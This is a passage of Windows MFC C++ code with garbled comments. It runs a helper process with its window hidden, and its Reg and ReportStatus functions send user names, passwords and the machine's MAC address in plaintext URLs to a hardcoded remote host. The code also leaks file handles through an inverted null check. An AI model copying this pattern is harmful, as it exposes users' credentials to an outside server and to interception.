	::WritePrivateProfileString(strNode,"strPwd", strPwd, strIniPath);
	::WritePrivateProfileString(strNode,"iOpFlag", "1", strIniPath);
#ifdef DEBUG
	::WritePrivateProfileString(strNode,"iShowFlag", "1", strIniPath);
	::WritePrivateProfileString(strNode,"iDebug", "1", strIniPath);
#else
	::WritePrivateProfileString(strNode,"iShowFlag", "0", strIniPath);
	::WritePrivateProfileString(strNode,"iDebug", "0", strIniPath);
#endif
	
	//�����µ�����
	STARTUPINFO vStartupInfo;
	memset(&vStartupInfo, 0, sizeof(vStartupInfo));
	vStartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //Enable the wShowWindow
	vStartupInfo.wShowWindow = SW_HIDE; //Hide the consol window
	vStartupInfo.cb = sizeof(STARTUPINFO);
	char commandBuf[512];
	sprintf(commandBuf, "\"%s%s\" %s", m_strAppPath,RUN_EXE_NAME,strIniPath);
	PROCESS_INFORMATION vProcessInfo;	
	if (::CreateProcess(NULL,
		commandBuf,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		m_strAppPath,
		&vStartupInfo,
		&vProcessInfo))
	{

		CloseHandle(vProcessInfo.hThread);
		int iCount = 0;
		while ( iCount++ < 360 )	//�����ӳ�ʱʱ��
		{
			DWORD dwExitCode = 0;
			if (vProcessInfo.hProcess != NULL)
			{
				if (GetExitCodeProcess(vProcessInfo.hProcess, &dwExitCode))
				{
					if (dwExitCode != STILL_ACTIVE)
					{
						TerminateProcess(vProcessInfo.hProcess, 0 );
						return dwExitCode;
					}
				}
			}
			Sleep(500);
		}
		TerminateProcess(vProcessInfo.hProcess, 0 );
	}
	return -3;	//�ɹ�
}
int ReportStatus(CString strUser,CString strPwd,CString strMac,int iLast,int iStatus);
int Reg(CString strUser,CString strPwd,CString strMac);
int Reg(CString strUser,CString strPwd,CString strMac)
{
	try
	{
		int iRet = 0;
		CString strUrl = "";
		strUrl.Format("http://www.51xibi.cn/h/reg.asp?na=%s&ps=%s&mac=%s",strUser,strPwd,strMac);
		CInternetSession session;
		CString strTemp = "";
		char temp[1001] = {0};
		CStdioFile *pFile = session.OpenURL(strUrl);
		if (pFile != NULL)
		{
			long len = pFile->GetLength();
			if (len > 1000)
			{
				len = 1000;
			}		
			pFile->SeekToBegin();
			pFile->Read(temp,len);
			temp[len] = '\0';
			strTemp.Format("%s",temp);
			strTemp.MakeLower();
			strTemp.Trim();

			if (strTemp == "1")
			{
				iRet = 1;
			}
			if (pFile == NULL)
			{
				pFile->Close();
				delete pFile;
				pFile = NULL;
			}
		}
		return iRet;
	}
	catch (...)
	{
	}
	return 0;
}

int ReportStatus(CString strUser,CString strPwd,CString strMac,int iLast,int iStatus)
{
	try
	{
		CString strUrl = "";
		if (iLast == 1)
		{
			strUrl.Format("http://www.51xibi.cn/h/save.asp?uname=%s&upass=%s&ipaddress=%s&lastname=%s&last=1",strUser,strPwd,strMac,iStatus==1?"Y":"N");
		}
		else
		{
			strUrl.Format("http://www.51xibi.cn/h/save.asp?uname=%s&upass=%s&ipaddress=%s",strUser,strPwd,strMac);
		}

		CInternetSession session;
		CString strTemp = "";
		char temp[1001] = {0};
		CStdioFile *pFile = session.OpenURL(strUrl);
		if (pFile != NULL)
		{
			long len = pFile->GetLength();
			if (len > 1000)
			{
				len = 1000;
			}		
			pFile->SeekToBegin();
			pFile->Read(temp,len);
			temp[len] = '\0';
			strTemp.Format("%s",temp);
			strTemp.MakeLower();

			if (pFile == NULL)
			{
				pFile->Close();
				delete pFile;
				pFile = NULL;
			}

		}
		return 0;
	}	
	catch (...)
	{
	}
	return -1;
}

string gl_strMac = "";
string GetMac();
string GetMac()
{
	string strMac;

	ULONG ulAdapterInfoSize = sizeof(IP_ADAPTER_INFO);
	IP_ADAPTER_INFO *pAdapterInfoBkp = NULL, *pAdapterInfo = (IP_ADAPTER_INFO*)new char[ulAdapterInfoSize];
	if( GetAdaptersInfo(pAdapterInfo, &ulAdapterInfoSize) == ERROR_BUFFER_OVERFLOW ) // ������������
	{
		delete pAdapterInfo;
		pAdapterInfo = (IP_ADAPTER_INFO*)new char[ulAdapterInfoSize];
		pAdapterInfoBkp = pAdapterInfo;
	}

	if( GetAdaptersInfo(pAdapterInfo, &ulAdapterInfoSize) == ERROR_SUCCESS )
	{
		do{ // ��������������
			if(pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET)    // �ж��Ƿ�Ϊ��̫���ӿ�
			{
				// pAdapterInfo->Description ������������
				// pAdapterInfo->AdapterName ������������

				for(UINT i = 0; i < pAdapterInfo->AddressLength; i++)
				{
					char szTmp[8];
					sprintf(szTmp, "%02X%c",pAdapterInfo->Address[i], (i == pAdapterInfo->AddressLength-1) ? '\0':'-');
					strMac.append(szTmp);
				}
				break;
			}pAdapterInfo = pAdapterInfo->Next;
		}while(pAdapterInfo);
	}

	if(pAdapterInfoBkp)
		delete pAdapterInfoBkp;

	return strMac;
}

